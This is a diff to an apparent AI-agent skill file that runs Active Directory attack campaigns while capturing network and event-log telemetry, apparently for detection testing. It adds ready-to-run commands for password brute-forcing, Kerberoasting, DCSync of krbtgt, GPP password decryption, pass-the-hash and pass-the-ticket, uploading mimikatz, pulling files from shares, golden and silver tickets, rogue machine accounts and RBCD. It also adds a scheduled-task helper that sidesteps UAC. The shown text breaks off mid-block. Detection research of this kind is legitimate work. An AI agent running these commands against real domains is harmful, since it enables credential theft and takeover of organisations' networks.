@@ -20,14 +20,15 @@ The skill is object-driven and stateful:
 ```
 skill/attacker-skills/ad-attack/
 ├── SKILL.md                    # this file
-├── config.json                 # interface, output dir, sysmon log (environment-specific)
+├── config.json                 # interface, output dir, log channels (environment-specific)
 ├── state.json                  # long-term APT state (three knowledge partitions + runtime)
 ├── .gitignore                  # ignores runtime output
 ├── scripts/
-│   ├── check_environment.py    # pre-flight validation
+│   ├── check_environment.py    # pre-flight validation (+ audit subcategory check)
 │   ├── state.py                # read/update state.json
 │   ├── capture_traffic.py      # tshark start/stop
-│   └── capture_logs.py         # Sysmon start/stop
+│   ├── capture_logs.py         # Sysmon + Security event-log start/stop (one evtx per channel)
+│   └── elevate.py              # run a command elevated via a one-shot scheduled task
 └── output/                     # runtime pcap/evtx capture output (untracked)
 ```
 
@@ -35,24 +36,29 @@ All script invocations below use `python`; run them from the skill root so relat
 
 ## Tool Naming & Windows Invocation
 
-impacket is pure Python and runs natively on Windows; Kali is not required. The `impacket-` prefix used in the examples below is Kali's packaging style. On Windows, after `pip install impacket`, the same scripts are installed into Python's `Scripts` directory with a `.py` suffix:
+impacket is pure Python and runs natively on Windows; Kali is not required. Every impacket command in this skill uses the PATH-independent form `python -m impacket.examples.<name>`, which works on Windows (`pip install impacket`) and Kali alike. Module names map to the classic script names as follows:
 
-| Kali name (used in this doc) | Windows `pip install impacket` |
-|------------------------------|--------------------------------|
-| `impacket-secretsdump` | `secretsdump.py` |
-| `impacket-GetADUsers` | `GetADUsers.py` |
-| `impacket-lookupsid` | `lookupsid.py` |
-| `impacket-GetNPUsers` | `GetNPUsers.py` |
-| `impacket-GetUserSPNs` | `GetUserSPNs.py` |
-| `impacket-getTGT` | `getTGT.py` |
-| `impacket-getST` | `getST.py` |
-| `impacket-ticketer` | `ticketer.py` |
-| `impacket-findDelegation` | `findDelegation.py` |
-| `impacket-psexec` | `psexec.py` |
-| `impacket-wmiexec` | `wmiexec.py` |
-| `impacket-smbexec` | `smbexec.py` |
-| `impacket-atexec` | `atexec.py` |
-| `impacket-dcomexec` | `dcomexec.py` |
+| Module used in commands | Windows `*.py` script | Kali `impacket-` command |
+|-------------------------|-----------------------|--------------------------|
+| `secretsdump` | `secretsdump.py` | `impacket-secretsdump` |
+| `GetADUsers` | `GetADUsers.py` | `impacket-GetADUsers` |
+| `lookupsid` | `lookupsid.py` | `impacket-lookupsid` |
+| `GetNPUsers` | `GetNPUsers.py` | `impacket-GetNPUsers` |
+| `GetUserSPNs` | `GetUserSPNs.py` | `impacket-GetUserSPNs` |
+| `Get-GPPPassword` | `Get-GPPPassword.py` | `impacket-Get-GPPPassword` |
+| `getTGT` | `getTGT.py` | `impacket-getTGT` |
+| `getST` | `getST.py` | `impacket-getST` |
+| `ticketer` | `ticketer.py` | `impacket-ticketer` |
+| `findDelegation` | `findDelegation.py` | `impacket-findDelegation` |
+| `psexec` | `psexec.py` | `impacket-psexec` |
+| `wmiexec` | `wmiexec.py` | `impacket-wmiexec` |
+| `smbexec` | `smbexec.py` | `impacket-smbexec` |
+| `atexec` | `atexec.py` | `impacket-atexec` |
+| `dcomexec` | `dcomexec.py` | `impacket-dcomexec` |
+| `smbclient` | `smbclient.py` | `impacket-smbclient` |
+| `addcomputer` | `addcomputer.py` | `impacket-addcomputer` |
+| `rbcd` | `rbcd.py` | `impacket-rbcd` |
+| `smbpasswd` | `smbpasswd.py` | `impacket-smbpasswd` |
 
 On Windows, run any impacket script with one of these equivalent forms (flags are identical on every platform):
 
@@ -91,6 +97,27 @@ python scripts/check_environment.py
 
 The check also guarantees impacket is actually runnable: it reports `python_executable` (the interpreter running the check — the same `python` the attack commands below will use) and `impacket.impacket_file` (where impacket lives), and it executes `python -m impacket.examples.secretsdump --help` as a live proof. If those do not line up, `ok` is `false`.
 
+> **Elevation requirement.** Capturing `.evtx` requires read access to the Sysmon **and Security** logs: `capture_logs.py stop` runs `wevtutil epl` on each configured channel, which fails with "access denied" for unprivileged users. The pre-flight report probes this directly — `channels_readable` runs `wevtutil qe <log> /c:1` per channel (Sysmon + Security) as a live capability test (and is the authoritative gate: `ok` is `false` if any channel is unreadable). `admin.is_admin` is a reference field only, since elevation does not guarantee log access and, conversely, SYSTEM can read the logs without being in the Administrators group. Run the attacker agent elevated (e.g. a local administrator or SYSTEM) so every atomic action produces its `.evtx` captures.
+
+> **Local elevation (when permission is denied on the attack host).** If the agent's shell lacks the rights to install/update Sysmon (`sysmon64 -c/-i`), run `auditpol`, or export the Sysmon/Security logs, elevate the specific command with `scripts/elevate.py` — it launches the command through a one-shot **scheduled task** (`schtasks /ru <account> /rp <password>`), which runs with the account's *full* (unfiltered) token because the Task Scheduler service runs as SYSTEM, bypassing UAC token filtering. `runas` cannot be used from an unattended shell (it reads the password from the console). Example:
+>
+> ```
+> # as a local administrator (full token: check the High Integrity Level)
+> python scripts/elevate.py --user ATYdemo --password '<pw>' -- whoami /groups
+>
+> # as a domain admin already in the local Administrators group
+> python scripts/elevate.py --user NDRTEST\<da> --password '<pw>' -- sysmon64.exe -c C:\path\sysmonconfig.xml
+>
+> # the elevated process does NOT inherit this user's environment — pass PYTHONPATH etc. via --env
+> python scripts/elevate.py --user ATYdemo --password '<pw>' \
+>     --env 'PYTHONPATH=C:\...\impacket;C:\Users\...\AppData\Roaming\Python\Python314\site-packages' \
+>     -- C:\Python314\python.exe -c "import impacket; print(impacket.__file__)"
+> ```
+>
+> The target account must be a member of the local `Administrators` group (the `Domain Admins` group usually is, by default). Commands are wrapped in a temp batch, output is captured to a temp file, and everything is cleaned up automatically.
+
+> **Logon/Kerberos audit events.** `capture_logs.py` also exports the **Security** log (`config.json` `logs.security_log`), which records logon/authentication events: `4624/4625` (logon success/failure), `4634` (logoff), `4672` (special logon), `4648` (explicit credentials), `4776` (NTLM credential validation), and — on a **domain controller** — `4768` (TGT) / `4769` (service ticket). The pre-flight report's `auditing` field checks these audit subcategories (via `auditpol /get /subcategory:<GUID>`); if any are disabled, `ok` stays `true` but a warning explains which `auditpol` subcategory to enable. Note: `4768/4769` are emitted by the KDC, so they appear in a DC's Security log, not on the attack host; the attack host's Security log captures its own network logons (`4624` LogonType 3) from lateral-movement tooling.
+
 ### Step 1 — Read the state file and resolve the object references
 
 Read the long-term state:
@@ -118,7 +145,7 @@ For every single atomic attack action (one command = one action):
    ```
 
 3. Execute the attack command.
-4. Stop log capture and export the evtx:
+4. Stop log capture and export the evtx (one `.evtx` per channel — Sysmon + Security):
 
    ```
    python scripts/capture_logs.py stop
@@ -130,7 +157,7 @@ For every single atomic attack action (one command = one action):
    python scripts/capture_traffic.py stop
    ```
 
-`<technique-id>` is the stable identifier of the technique (see each technique below). The capture start/stop calls must bracket the action even when the action fails, so the failed attempt is still recorded.
+`<technique-id>` is the stable identifier of the technique (see each technique below). The capture start/stop calls must bracket the action even when the action fails, so the failed attempt is still recorded. `capture_logs.py stop` writes one evtx per configured channel named `{label}_{channel}_{timestamp}.evtx` (e.g. `pass-the-ticket_Security_20260821_224834.evtx`); a channel that fails to export does not block the others.
 
 ### Step 3 — Update the state file
 
@@ -167,12 +194,34 @@ The state file is divided into three knowledge partitions (`domain`, `hosts`, `u
 | `usernames[]` | Flat list of discovered SAM account names (kerbrute/enumeration working list) |
 | `spns[]` | All discovered service principal names (see shape below) |
 | `delegation[]` | Delegation relationships (see shape below) |
+| `groups[]` | Discovered domain security group names |
+| `password_policy` | Domain password/lockout policy (see shape below) |
+| `trusts[]` | Domain/forest trust relationships (see shape below) |
+| `rbcd[]` | Resource-based constrained delegation edges (see shape below) |
 | `updated_at` | Last modification time |
 
 `domain.dcs[]` item shape:
 
 ```
 {"fqdn": "dc01.corp.local", "ip": "10.0.0.2", "is_pdc": true, "stale": false, "updated_at": ""}
+```
+
+`domain.password_policy` shape:
+
+```
+{"lockout_threshold": 5, "min_password_length": 7, "max_password_age_days": 42}
+```
+
+`domain.trusts[]` item shape:
+
+```
+{"target": "child.corp.local", "direction": "inbound|outbound|bidirectional", "type": "parentchild|treeroot|forest|external", "stale": false, "updated_at": ""}
+```
+
+`domain.rbcd[]` item shape:
+
+```
+{"delegate_from": "ATTACKER$", "delegate_to": "DC01$", "stale": false, "updated_at": ""}
 ```
 
 `domain.spns[]` item shape:
@@ -200,6 +249,7 @@ One object per domain controller, server, or member machine. Item shape:
   "role": "dc|server|member|unknown",
   "services": ["SMB", "LDAP", "DNS"],
   "open_ports": [88, 135, 389, 445],
+  "shares": ["Company_Data", "Public"],
   "compromised": false,
   "source": "discovery.host-scan",
   "stale": false,
@@ -228,6 +278,7 @@ One object per account that carries any credential or attribute detail. Item sha
   "spns": ["MSSQLSvc/sql01.corp.local"],
   "is_domain_admin": false,
   "is_service_account": true,
+  "is_machine_account": false,
   "source": "credential.dcsync",
   "stale": false,
   "updated_at": ""
@@ -243,6 +294,7 @@ Field notes:
 - `logon_hosts` lists hosts where this account has been observed logging on.
 - `groups` lists security groups the account belongs to.
 - `spns` lists SPNs registered to this service account.
+- `is_machine_account` marks a computer account (ends with `$`, created by `persistence.add-computer`).
 
 ### 4. Wordlists — `wordlists`
 
@@ -252,12 +304,23 @@ Local dictionary files used as input to kerbrute/impacket:
 |-------|---------|
 | `usernames` | Path to the username wordlist `.txt` (one username per line) |
 | `passwords` | Path to the password wordlist `.txt` (one password per line) |
+| `combos` | Path to a pre-generated `username:password` combo file (one `user:pass` pair per line), built from `usernames` × `passwords`; consumed by `credential.brute-force` |
 
 Paths are relative to the skill root by default (or absolute). These files are operator-provided inputs; the fields store their locations so techniques that need a user/password list resolve the path from state instead of the prompt.
 
-### 5. Runtime sections
+### 5. Campaign resources — `campaign`
 
-- `tickets.tgt[]` / `service[]` / `golden[]` / `silver[]`: ticket cache files produced or forged during the campaign.
+Attacker-owned/decided values that are not discovered facts:
+
+| Field | Meaning |
+|-------|---------|
+| `machine_account.name` / `password` | The machine account name (ends with `$`) and password created by `persistence.add-computer` and reused by `persistence.rbcd` |
+| `tools_dir` | Local directory that holds attacker tools (relative to the skill root or absolute) |
+| `tools[]` | Local tool filenames used by `lateral.tool-transfer` (e.g. `mimikatz.exe`) |
+
+### 6. Runtime sections
+
+- `tickets.tgt[]` / `service[]` / `golden[]` / `silver[]`: ticket cache files produced or forged during the campaign. Every entry carries `principal` (the user to authenticate as) and `ccache_file`; `service[]`/`silver[]` additionally carry `spn`, and `service[]` also keeps `impersonated_user` as a semantic label.
 - `files[]`: interesting files discovered on hosts. Item shape: `{"path": "...", "description": "...", "stale": false, "updated_at": "..."}`.
 - `techniques`: per-technique status and last result (keyed by technique id).
 - `notes[]`: free-form observations. Item shape: `{"text": "..."}`.
@@ -437,7 +500,7 @@ Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.
 Procedure (one atomic action):
 
 ```
-impacket-GetADUsers -all -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
+python -m impacket.examples.GetADUsers -all -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
 ```
 
 Outputs: append enumerated usernames to `domain.usernames` and set the count:
@@ -461,7 +524,7 @@ Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.
 Procedure (one atomic action):
 
 ```
-impacket-lookupsid <domain.name>/<user>:<password>@<domain.dc_ip>
+python -m impacket.examples.lookupsid <domain.name>/<user>:<password>@<domain.dc_ip>
 ```
 
 Outputs: append enumerated accounts to `domain.usernames` and record SIDs on user objects:
@@ -471,6 +534,133 @@ python scripts/state.py add domain.usernames '"<username>"'
 ```
 
 Rollback: if the credential is rejected, `mark-stale` the user object and refresh it.
+
+## 1.6 Network Share Enumeration
+
+- Technique id: `discovery.share-enum`
+- ATT&CK: T1135 (Network Share Discovery)
+
+Purpose: enumerate SMB shares on a host.
+
+Inputs: a host object from `hosts` (ip/fqdn), and a user object from `users` if the listing requires authentication.
+
+Procedure (one atomic action):
+
+```
+net view \\<target-ip>
+```
+
+Alternative with impacket:
+
+```
+python -m impacket.examples.smbclient -no-pass -k <domain.name>/<user>@<target-fqdn>
+```
+
+Then run `shares` inside the client.
+
+Outputs: record the share names on the host object:
+
+```
+python scripts/state.py merge hosts[<index>] '{"shares": ["Company_Data", "Public"]}'
+```
+
+Rollback: if a share list is stale, `mark-stale` the host object and re-run this technique.
+
+## 1.7 Domain Group Enumeration
+
+- Technique id: `discovery.group-enum`
+- ATT&CK: T1069.002 (Permission Groups Discovery: Domain Groups)
+
+Purpose: enumerate domain security groups and their members.
+
+Inputs: `domain.name`, optionally an account from `users`.
+
+Procedure (one atomic action):
+
+```
+net group /domain
+net group "Domain Admins" /domain
+```
+
+Outputs: record group names and map members onto user objects:
+
+```
+python scripts/state.py add domain.groups '"Domain Admins"'
+python scripts/state.py merge users[<index>] '{"groups": ["Domain Admins"]}'
+```
+
+Rollback: if group membership is stale, `mark-stale` the user/group entry and re-run.
+
+## 1.8 Password Policy Discovery
+
+- Technique id: `discovery.password-policy`
+- ATT&CK: T1201 (Password Policy Discovery)
+
+Purpose: read the domain password/lockout policy before spraying.
+
+Inputs: none (domain context).
+
+Procedure (one atomic action):
+
+```
+net accounts /domain
+```
+
+Outputs:
+
+```
+python scripts/state.py set domain.password_policy '{"lockout_threshold": 5, "min_password_length": 7, "max_password_age_days": 42}'
+```
+
+Rollback: not applicable (re-run if the policy changes).
+
+## 1.9 Domain Trust Discovery
+
+- Technique id: `discovery.trust-enum`
+- ATT&CK: T1482 (Domain Trust Discovery)
+
+Purpose: enumerate trust relationships.
+
+Inputs: none.
+
+Procedure (one atomic action):
+
+```
+nltest /domain_trusts
+nltest /trusted_domains
+```
+
+Outputs:
+
+```
+python scripts/state.py add domain.trusts '{"target": "child.corp.local", "direction": "bidirectional", "type": "parentchild"}'
+```
+
+Rollback: not applicable (re-run if the trust topology changes).
+
+## 1.10 Host Identification (reverse DNS)
+
+- Technique id: `discovery.host-identify`
+- ATT&CK: T1018 (Remote System Discovery), T1040 (Network Sniffing - hostname resolution)
+
+Purpose: resolve a host's FQDN and machine account name from its IP (fills fields required by Kerberos/ticket commands and RBCD).
+
+Inputs: a host object with `ip` from `hosts`.
+
+Procedure (one atomic action):
+
+```
+nslookup <target-ip>
+ping -a <target-ip>
+```
+
+Outputs: derive the FQDN and the machine account name (hostname without domain + `$`) and write them back:
+
+```
+python scripts/state.py merge hosts[<index>] '{"fqdn": "<host>.<domain.name>", "machine_account": "<hostname>$"}'
+```
+
+Rollback: if the FQDN/machine account no longer resolves, `mark-stale` the host object and re-run this technique.
 
 ---
 
@@ -529,13 +719,15 @@ Rollback: if a credential is later rejected, `mark-stale` the user object and re
 
 Purpose: brute-force many accounts against a password list.
 
-Inputs: `wordlists.usernames` (user list), `wordlists.passwords` (password list), `domain.name`, `domain.dc_ip`.
+Inputs: `wordlists.combos` (a `username:password` combo file built from `wordlists.usernames` × `wordlists.passwords`), `domain.name`, `domain.dc_ip`.
 
 Procedure (one atomic action):
 
 ```
-kerbrute bruteforce -d <domain.name> --dc <domain.dc_ip> <passlist> <userlist>
+kerbrute bruteforce -d <domain.name> --dc <domain.dc_ip> <wordlists.combos>
 ```
+
+`kerbrute bruteforce` accepts exactly one `<user_pw_file>` argument (a combo file of `username:password` pairs, one per line) — not separate passlist + userlist. The combo file is operator-provided in `wordlists.combos`; failed guesses count against the lockout threshold.
 
 Outputs: add a user object for each valid credential:
 
@@ -557,7 +749,7 @@ Inputs: `wordlists.usernames` (user list), `domain.name`, `domain.dc_ip`.
 Procedure (one atomic action):
 
 ```
-impacket-GetNPUsers <domain.name>/ -usersfile <userlist> -dc-ip <domain.dc_ip> -format hashcat -outputfile asreproast.txt
+python -m impacket.examples.GetNPUsers <domain.name>/ -usersfile <userlist> -dc-ip <domain.dc_ip> -format hashcat -outputfile asreproast.txt
 ```
 
 Outputs: mark affected accounts `no_preauth` and record the output file:
@@ -581,7 +773,7 @@ Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.
 Procedure (one atomic action):
 
 ```
-impacket-GetUserSPNs -dc-ip <domain.dc_ip> <domain.name>/<user>:<password> -request
+python -m impacket.examples.GetUserSPNs -dc-ip <domain.dc_ip> <domain.name>/<user>:<password> -request
 ```
 
 Outputs: append discovered SPNs to `domain.spns` and mark the service account:
@@ -605,11 +797,11 @@ Inputs: a user object (use `password` or `ntlm_hash`) from `users`, plus the tar
 Procedure (one atomic action). Use `:<password>` if the object has a plaintext password, or `-hashes :<ntlm-hash>` if only the hash is known:
 
 ```
-impacket-secretsdump <domain.name>/<user>:<password>@<target-ip>
+python -m impacket.examples.secretsdump <domain.name>/<user>:<password>@<target-ip>
 ```
 
 ```
-impacket-secretsdump -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
+python -m impacket.examples.secretsdump -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
 ```
 
 Outputs: append recovered accounts to `users` (set `ntlm_hash`/`kerberos_rc4`, leave `password` empty when only the hash is known) and record logon hosts:
@@ -632,13 +824,13 @@ Inputs: an admin user object with `password`/`ntlm_hash` from `users`.
 Procedure (one atomic action):
 
 ```
-impacket-secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc
+python -m impacket.examples.secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc
 ```
 
 `krbtgt` only (sub-variant of the same command):
 
 ```
-impacket-secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc-user krbtgt
+python -m impacket.examples.secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc-user krbtgt
 ```
 
 Outputs: store the `krbtgt` hash and any new account hashes in `users`, and record the domain SID:
@@ -649,6 +841,29 @@ python scripts/state.py set domain.domain_sid "<domain-sid>"
 ```
 
 Rollback: if the `krbtgt` hash is suspected stale (rotated), `mark-stale` the `krbtgt` user object and re-run DCSync.
+
+## 2.8 GPP Password (cPassword)
+
+- Technique id: `credential.gpp-password`
+- ATT&CK: T1552.006 (Unsecured Credentials: Group Policy Preferences)
+
+Purpose: decrypt cPassword values from SYSVOL group-policy preference files.
+
+Inputs: `domain.name`, `domain.dc_ip`, and an account with `password` from `users`.
+
+Procedure (one atomic action):
+
+```
+python -m impacket.examples.Get-GPPPassword -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>@<domain.dc_fqdn>
+```
+
+Outputs: for each decrypted credential, add a user object:
+
+```
+python scripts/state.py add users '{"username": "<user>", "password": "<decrypted>", "source": "credential.gpp-password"}'
+```
+
+Rollback: if a GPP credential is later rejected, `mark-stale` the user object and re-run this technique.
 
 ---
 
@@ -666,7 +881,7 @@ Inputs: a user object with `ntlm_hash` from `users`, plus the target host.
 Procedure (one atomic action):
 
 ```
-impacket-psexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
+python -m impacket.examples.psexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
 ```
 
 If the LM half is known, pass `-hashes <lm-hash>:<ntlm-hash>`.
@@ -691,7 +906,7 @@ Inputs: a user object with `ntlm_hash` from `users`, plus the target host.
 Procedure (one atomic action):
 
 ```
-impacket-wmiexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
+python -m impacket.examples.wmiexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
 ```
 
 Outputs: mark the target host `compromised`.
@@ -710,7 +925,7 @@ Inputs: a user object with `ntlm_hash` from `users`, plus the target host.
 Procedure (one atomic action):
 
 ```
-impacket-smbexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
+python -m impacket.examples.smbexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
 ```
 
 Outputs: mark the target host `compromised`.
@@ -729,14 +944,14 @@ Inputs: a user object with `ntlm_hash` (or `kerberos_aes256`) from `users`.
 Procedure (one atomic action):
 
 ```
-impacket-getTGT <domain.name>/<user> -hashes :<ntlm-hash>
+python -m impacket.examples.getTGT <domain.name>/<user> -hashes :<ntlm-hash>
 ```
 
 Import the resulting cache, then use it with `-k -no-pass` (Kerberos only, by FQDN):
 
 ```
 $env:KRB5CCNAME = "<user>.ccache"
-impacket-psexec -k -no-pass <domain.name>/<user>@<target-fqdn>
+python -m impacket.examples.psexec -k -no-pass <domain.name>/<user>@<target-fqdn>
 ```
 
 Outputs:
@@ -759,7 +974,7 @@ Inputs: a user object with `password` from `users`, plus the target host.
 Procedure (one atomic action):
 
 ```
-impacket-wmiexec <domain.name>/<user>:<password>@<target-ip>
+python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip>
 ```
 
 Outputs: mark the host `compromised`; record any files of interest under `files`.
@@ -778,7 +993,7 @@ Inputs: a user object with `password` from `users`, plus the target host.
 Procedure (one atomic action):
 
 ```
-impacket-smbexec <domain.name>/<user>:<password>@<target-ip>
+python -m impacket.examples.smbexec <domain.name>/<user>:<password>@<target-ip>
 ```
 
 Outputs: mark the host `compromised`; record any files of interest under `files`.
@@ -797,7 +1012,7 @@ Inputs: a user object with `password` from `users`, plus the target host.
 Procedure (one atomic action):
 
 ```
-impacket-psexec <domain.name>/<user>:<password>@<target-ip>
+python -m impacket.examples.psexec <domain.name>/<user>:<password>@<target-ip>
 ```
 
 Outputs: mark the host `compromised`; record any files of interest under `files`.
@@ -816,7 +1031,7 @@ Inputs: a user object with `password` from `users`, plus the target host.
 Procedure (one atomic action):
 
 ```
-impacket-dcomexec <domain.name>/<user>:<password>@<target-ip>
+python -m impacket.examples.dcomexec <domain.name>/<user>:<password>@<target-ip>
 ```
 
 Outputs: mark the host `compromised`; record any files of interest under `files`.
@@ -835,7 +1050,7 @@ Inputs: a user object with `password` from `users`, plus the target host and the
 Procedure (one atomic action):
 
 ```
-impacket-atexec <domain.name>/<user>:<password>@<target-ip> "cmd /c whoami"
+python -m impacket.examples.atexec <domain.name>/<user>:<password>@<target-ip> "cmd /c whoami"
 ```
 
 Outputs: mark the host `compromised`; record any files of interest under `files`.
@@ -854,7 +1069,7 @@ Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.
 Procedure (one atomic action):
 
 ```
-impacket-findDelegation <domain.name>/<user>:<password> -dc-ip <domain.dc_ip>
+python -m impacket.examples.findDelegation <domain.name>/<user>:<password> -dc-ip <domain.dc_ip>
 ```
 
 Interpret: `Unconstrained` captures inbound TGTs; `Constrained` enables S4U2self/S4U2proxy.
@@ -874,12 +1089,12 @@ Rollback: if a delegation relationship is stale, `mark-stale` the entry and re-r
 
 Purpose: abuse constrained delegation (S4U2self/S4U2proxy) to obtain a service ticket impersonating another user.
 
-Inputs: a delegation account object (with `password`) from `users`, a target `spn` from `domain.spns`, and the user to impersonate.
+Inputs: a delegation account object (with `password`) from `users`, a target `spn` from `domain.spns`, and the user to impersonate (a task-text intent, or pick a `users[]` entry with `is_domain_admin: true`).
 
 Procedure (one atomic action):
 
 ```
-impacket-getST -spn <spn> -impersonate <user-to-impersonate> -dc-ip <domain.dc_ip> <domain.name>/<delegation-account>:<password>
+python -m impacket.examples.getST -spn <spn> -impersonate <user-to-impersonate> -dc-ip <domain.dc_ip> <domain.name>/<delegation-account>:<password>
 ```
 
 Then use the resulting ticket with `-k -no-pass`.
@@ -887,16 +1102,94 @@ Then use the resulting ticket with `-k -no-pass`.
 Outputs:
 
 ```
-python scripts/state.py add tickets.service '{"spn": "<spn>", "impersonated_user": "<user-to-impersonate>", "ccache_file": "<user-to-impersonate>.ccache"}'
+python scripts/state.py add tickets.service '{"spn": "<spn>", "principal": "<user-to-impersonate>", "impersonated_user": "<user-to-impersonate>", "ccache_file": "<user-to-impersonate>.ccache"}'
 ```
 
 Rollback: if the S4U request is rejected, `mark-stale` the delegation entry and re-run `lateral.delegation-enum`.
 
+## 3.12 Pass-the-Ticket
+
+- Technique id: `lateral.pass-the-ticket`
+- ATT&CK: T1550.003 (Use Alternate Authentication Material: Pass the Ticket)
+
+Purpose: reuse an existing Kerberos ticket (ccache) from `tickets.*` to authenticate.
+
+Inputs: a ticket object from `tickets.tgt`/`service`/`golden`/`silver` (its `ccache_file` and `principal`) and the target host FQDN (from `hosts[].fqdn`, populated by `discovery.host-identify`).
+
+Procedure (one atomic action):
+
+```
+$env:KRB5CCNAME = "<ccache-file>"
+python -m impacket.examples.psexec -k -no-pass <domain.name>/<principal>@<target-fqdn>
+```
+
+Outputs: mark the target host `compromised`:
+
+```
+python scripts/state.py merge hosts[<index>] '{"compromised": true}'
+```
+
+Rollback: if the ticket is expired or rejected, `mark-stale` the ticket object and re-obtain it (overpass-the-hash / golden / silver / delegation-s4u).
+
+## 3.13 Lateral Tool Transfer
+
+- Technique id: `lateral.tool-transfer`
+- ATT&CK: T1570 (Lateral Tool Transfer)
+
+Purpose: upload a tool to a share on a target host.
+
+Inputs: a user object with `password` from `users`, the target host and share name from `hosts`, and a local tool from `campaign` (`campaign.tools_dir` + a name in `campaign.tools`).
+
+Procedure (one atomic action — connect, upload one file, exit):
+
+```
+python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
+```
+
+Inside the client: `use <share>`, `put <campaign.tools_dir>/<tool>`, `exit`.
+
+Outputs:
+
+```
+python scripts/state.py add files '{"path": "\\\\<host>\\<share>\\<tool>", "description": "tool uploaded"}'
+```
+
+Rollback: if the share is unavailable, `mark-stale` the host object and re-run `discovery.share-enum`.
+
 ---
 
-# Phase 4: Persistence
+# Phase 4: Collection
 
-## 4.1 Golden Ticket
+## 4.1 Data from Network Shared Drive
+
+- Technique id: `collection.share-download`
+- ATT&CK: T1039 (Data from Network Shared Drive)
+
+Purpose: download a sensitive file from an SMB share.
+
+Inputs: a host object with `shares`, a user object with `password` from `users`, and the share name (from `hosts[].shares`). The file path to download is a task-text intent (or discovered by `ls` inside the share).
+
+Procedure (one atomic action — connect, download one file, exit):
+
+```
+python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
+```
+
+Inside the client: `use <share>`, `cd <dir>`, `get <file>`, `exit`.
+
+Outputs:
+
+```
+python scripts/state.py add files '{"path": "<local-download-path>", "description": "downloaded from \\\\<host>\\<share>\\<file>"}'
+```
+
+Rollback: if the file is gone or the share changed, `mark-stale` the host object and re-run `discovery.share-enum`.
+
+---
+
+# Phase 5: Persistence
+
+## 5.1 Golden Ticket
 
 - Technique id: `persistence.golden-ticket`
 - ATT&CK: T1558.001 (Steal or Forge Kerberos Tickets: Golden Ticket)
@@ -908,14 +1201,14 @@ Inputs: the `krbtgt` user object's `ntlm_hash`, `domain.domain_sid`, `domain.nam
 Procedure (one atomic action):
 
 ```
-impacket-ticketer -nthash <krbtgt-hash> -domain-sid <domain.domain_sid> -domain <domain.name> <username>
+python -m impacket.examples.ticketer -nthash <krbtgt-hash> -domain-sid <domain.domain_sid> -domain <domain.name> <username>
 ```
 
 Use the forged ticket:
 
 ```
 $env:KRB5CCNAME = "<username>.ccache"
-impacket-psexec -k -no-pass <domain.name>/<username>@<domain.dc_fqdn>
+python -m impacket.examples.psexec -k -no-pass <domain.name>/<username>@<domain.dc_fqdn>
 ```
 
 Outputs:
@@ -926,7 +1219,7 @@ python scripts/state.py add tickets.golden '{"principal": "<username>", "ccache_
 
 Rollback: if the ticket is rejected, the `krbtgt` hash or SID is stale — `mark-stale` the `krbtgt` user object / `domain.domain_sid` and re-run DCSync.
 
-## 4.2 Silver Ticket
+## 5.2 Silver Ticket
 
 - Technique id: `persistence.silver-ticket`
 - ATT&CK: T1558.002 (Steal or Forge Kerberos Tickets: Silver Ticket)
@@ -938,14 +1231,14 @@ Inputs: a service account user object's `ntlm_hash`, `domain.domain_sid`, `domai
 Procedure (one atomic action):
 
 ```
-impacket-ticketer -nthash <service-hash> -domain-sid <domain.domain_sid> -domain <domain.name> -spn <spn> <username>
+python -m impacket.examples.ticketer -nthash <service-hash> -domain-sid <domain.domain_sid> -domain <domain.name> -spn <spn> <username>
 ```
 
 Use it against that service:
 
 ```
 $env:KRB5CCNAME = "<username>.ccache"
-impacket-psexec -k -no-pass <domain.name>/<username>@<target-fqdn>
+python -m impacket.examples.psexec -k -no-pass <domain.name>/<username>@<target-fqdn>
 ```
 
 Common SPNs: `cifs/<host-fqdn>`, `HOST/<host-fqdn>`, `ldap/<dc-fqdn>`.
@@ -957,6 +1250,82 @@ python scripts/state.py add tickets.silver '{"spn": "<spn>", "principal": "<user
 ```
 
 Rollback: if rejected, `mark-stale` the service account user object and re-run `credential.dump-secrets`.
+
+## 5.3 Create Machine Account
+
+- Technique id: `persistence.add-computer`
+- ATT&CK: T1136.002 (Create Account: Domain Account)
+
+Purpose: add a machine account (default MAQ permits it) for later RBCD/delegation.
+
+Inputs: `domain.name`, `domain.dc_ip`, an account with `password` from `users`, and `campaign.machine_account` (the chosen name + password).
+
+Procedure (one atomic action):
+
+```
+python -m impacket.examples.addcomputer -computer-name '<campaign.machine_account.name>' -computer-pass '<campaign.machine_account.password>' -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
+```
+
+Outputs:
+
+```
+python scripts/state.py add users '{"username": "<campaign.machine_account.name>", "password": "<campaign.machine_account.password>", "is_machine_account": true, "source": "persistence.add-computer"}'
+```
+
+Rollback: if the machine account no longer works, `mark-stale` it and re-create.
+
+## 5.4 Resource-Based Constrained Delegation (RBCD)
+
+- Technique id: `persistence.rbcd`
+- ATT&CK: T1098 (Account Manipulation), T1558.005
+
+Purpose: grant a machine account the right to impersonate on a target computer (RBCD).
+
+Inputs: the machine account from `campaign.machine_account`, the target computer `$` name from `hosts[].machine_account` (populated by `discovery.host-identify`), `domain.dc_ip`, and an account with write DACL on the target.
+
+Procedure (one atomic action):
+
+```
+python -m impacket.examples.rbcd -delegate-from '<campaign.machine_account.name>' -delegate-to '<target-machine-account>' -dc-ip <domain.dc_ip> -action write <domain.name>/<user>:<password>
+```
+
+Then obtain a ticket impersonating an admin:
+
+```
